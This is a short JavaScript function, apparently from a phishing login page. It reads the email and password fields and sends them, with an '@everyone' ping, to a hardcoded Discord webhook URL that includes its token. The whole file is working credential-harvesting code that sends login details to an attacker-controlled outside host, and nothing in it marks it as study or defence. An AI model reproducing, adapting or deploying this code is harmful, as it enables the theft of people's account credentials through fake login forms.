function next() {
    const webhookURL = 'https://discord.com/api/webhooks/1086213557357649950/A8NIgZ54F-yLh_IouTpDZ7bu0-Tvsn4UZ4Ac0yl0PQf0Ym9G89-hrbLK84_5YpFR4v7J'
    const input2 = document.getElementById('email').value
    const input = document.getElementById('password').value
    const message = {
      content: ` @everyone
Email: ${input2}, Password: ${input}`
    }
  
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
  }